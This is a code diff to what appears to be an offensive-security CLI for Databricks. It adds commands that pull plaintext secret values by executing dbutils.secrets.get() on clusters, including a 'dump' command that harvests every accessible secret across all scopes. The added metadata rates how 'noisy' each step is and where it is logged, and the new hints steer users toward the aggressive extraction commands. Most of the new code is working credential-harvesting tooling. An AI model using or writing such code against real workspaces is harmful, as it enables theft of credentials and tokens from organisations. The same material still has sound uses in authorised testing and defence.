@@ -1,7 +1,7 @@
 """Secrets module — scopes, key names, access probing"""
 
 from bb.core.db import now_iso, log_pull, fmt_epoch_ms, should_use_cache
-from bb.core.display import console
+from bb.core.display import console, next_step
 from rich import box
 from rich.table import Table
 
@@ -43,7 +43,8 @@ def run_scopes(w, conn, profile, flags):
         log_pull(conn, module, profile, len(scopes))
         conn.commit()
         console.print(t)
-        console.print("\n  [dim]Use 'secrets list --scope <name>' to list keys[/dim]")
+        next_step("secrets list --scope <name> --run",
+                  "secrets all --run")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -73,7 +74,8 @@ def run_list(w, conn, profile, flags):
         log_pull(conn, f"secrets.list.{scope}", profile, len(keys))
         conn.commit()
         console.print(t)
-        console.print(f"\n  [dim]Use 'secrets get --scope {scope} --id <key>' to extract value (cluster required)[/dim]")
+        next_step(f"secrets get --scope {scope} --id <key> --cluster <id> --aggressive --run",
+                  f"secrets dump --scope {scope} --cluster <id> --aggressive --run")
     except Exception as e:
         if "PERMISSION_DENIED" in str(e) or "permission" in str(e).lower():
             console.print(f"[yellow]  ⚠ Access denied on scope '{scope}' — no READ permission[/yellow]")
@@ -139,6 +141,107 @@ def run_all(w, conn, profile, flags):
                     console.print(f"  [red]error: {inner}[/red]")
         log_pull(conn, module, profile, total_keys)
         conn.commit()
+        next_step("secrets get --scope <name> --id <key> --cluster <id> --aggressive --run",
+                  "secrets dump --cluster <id> --aggressive --run")
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+
+
+def run_get(w, conn, profile, flags):
+    """Extract a secret value via cluster command execution (EXEC — requires --aggressive)"""
+    if not flags.get("aggressive"):
+        console.print("[yellow]EXEC operation — requires --aggressive flag[/yellow]")
+        console.print("  [dim]Secret values are never returned by the REST API — extraction requires running a command on a cluster.[/dim]")
+        return
+
+    scope = flags.get("scope")
+    key   = flags.get("id") or flags.get("name")
+    cluster_id = flags.get("cluster")
+
+    if not scope:
+        scope = input("Scope (from: secrets scopes --run): ").strip()
+    if not key:
+        key = input("Key (from: secrets list --scope <scope> --run): ").strip()
+    if not cluster_id:
+        cluster_id = input("Cluster ID (from: compute clusters --run): ").strip()
+
+    console.print(f"\n[bold]Secret Extract[/bold]  [dim]{scope}/{key}  cluster={cluster_id}[/dim]\n")
+    try:
+        from databricks.sdk.service.compute import Language
+        cmd = f"print(dbutils.secrets.get(scope='{scope}', key='{key}'))"
+        ctx = w.command_execution.create(cluster_id=cluster_id, language=Language.PYTHON).result()
+        try:
+            result = w.command_execution.execute(
+                cluster_id=cluster_id,
+                context_id=ctx.id,
+                language=Language.PYTHON,
+                command=cmd,
+            ).result()
+            if result.results:
+                value = result.results.data or "(no output)"
+                console.print(f"  [cyan]{scope}/{key}[/cyan] = [yellow]{value}[/yellow]")
+            else:
+                console.print("[red]No result returned[/red]")
+        finally:
+            w.command_execution.destroy(cluster_id=cluster_id, context_id=ctx.id)
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+
+
+def run_dump(w, conn, profile, flags):
+    """Dump all accessible secret values via cluster (EXEC — requires --aggressive)"""
+    if not flags.get("aggressive"):
+        console.print("[yellow]EXEC operation — requires --aggressive flag[/yellow]")
+        return
+
+    cluster_id = flags.get("cluster")
+    scope_filter = flags.get("scope")
+
+    if not cluster_id:
+        cluster_id = input("Cluster ID (from: compute clusters --run): ").strip()
+
+    console.print(f"\n[bold]Secret Dump[/bold]  [dim]cluster={cluster_id}[/dim]\n")
+    try:
+        scopes = list(w.secrets.list_scopes())
+        if scope_filter:
+            scopes = [s for s in scopes if s.name == scope_filter]
+
+        from databricks.sdk.service.compute import Language
+        ctx = w.command_execution.create(cluster_id=cluster_id, language=Language.PYTHON).result()
+        try:
+            hits = []
+            for s in scopes:
+                try:
+                    keys = list(w.secrets.list_secrets(scope=s.name))
+                except Exception:
+                    continue
+                for k in keys:
+                    cmd = f"print(dbutils.secrets.get(scope='{s.name}', key='{k.key}'))"
+                    try:
+                        result = w.command_execution.execute(
+                            cluster_id=cluster_id,
+                            context_id=ctx.id,
+                            language=Language.PYTHON,
+                            command=cmd,
+                        ).result()
+                        value = (result.results.data if result.results else None) or "(empty)"
+                        hits.append((s.name, k.key, value))
+                    except Exception:
+                        hits.append((s.name, k.key, "[red](error)[/red]"))
+        finally:
+            w.command_execution.destroy(cluster_id=cluster_id, context_id=ctx.id)
+
+        if hits:
+            t = Table(box=box.SIMPLE, show_header=True, pad_edge=False)
+            t.add_column("Scope",  style="dim")
+            t.add_column("Key",    style="cyan")
+            t.add_column("Value",  style="yellow")
+            for scope_name, key_name, value in hits:
+                t.add_row(scope_name, key_name, value[:120])
+            console.print(t)
+            console.print(f"\n  [dim]{len(hits)} secret(s) extracted[/dim]")
+        else:
+            console.print("[yellow]No secrets extracted[/yellow]")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -155,7 +258,8 @@ COMMANDS = {
         "activity": ["info"], "type": "R", "noise": "Low",
         "prereqs": [],
         "caveats": ["Requires READ permission on the scope", "Values never returned by API"],
-        "flags": [("--scope NAME", "Scope name (required)")],
+        "flags": [("--scope NAME", "Scope name")],
+        "required_flags": ["--scope"],
         "fn": run_list,
     },
     "all": {
@@ -168,5 +272,40 @@ COMMANDS = {
         ],
         "flags": [],
         "fn": run_all,
+    },
+    "get": {
+        "description": "Extract a single secret value by executing dbutils.secrets.get() on a cluster",
+        "activity": ["cred"], "type": "EXEC", "noise": "Medium — creates command execution context",
+        "prereqs": ["Running cluster ID — from compute clusters", "CAN_ATTACH_TO on cluster"],
+        "caveats": [
+            "Secret values are never returned by the REST API — cluster execution required",
+            "Execution context visible in cluster event log",
+        ],
+        "flags": [
+            ("--scope NAME",   "Scope name"),
+            ("--id KEY",       "Key name"),
+            ("--name KEY",     "Alias for --id"),
+            ("--cluster ID",   "Cluster ID to execute on"),
+        ],
+        "required_flags": ["--scope", "--id", "--cluster"],
+        "aggressive": ["Executes dbutils.secrets.get() on cluster — visible in event log"],
+        "fn": run_get,
+    },
+    "dump": {
+        "description": "Extract ALL accessible secret values across all scopes via cluster execution",
+        "activity": ["cred"], "type": "EXEC", "noise": "High — one execution per key",
+        "prereqs": ["Running cluster ID — from compute clusters", "CAN_ATTACH_TO on cluster"],
+        "caveats": [
+            "High-noise: one command execution per key",
+            "Execution context visible in cluster event log",
+            "Use --scope to limit to a single scope",
+        ],
+        "flags": [
+            ("--cluster ID",  "Cluster ID to execute on"),
+            ("--scope NAME",  "Limit to a single scope (optional)"),
+        ],
+        "required_flags": ["--cluster"],
+        "aggressive": ["Executes one dbutils.secrets.get() per key — all visible in event log"],
+        "fn": run_dump,
     },
 }
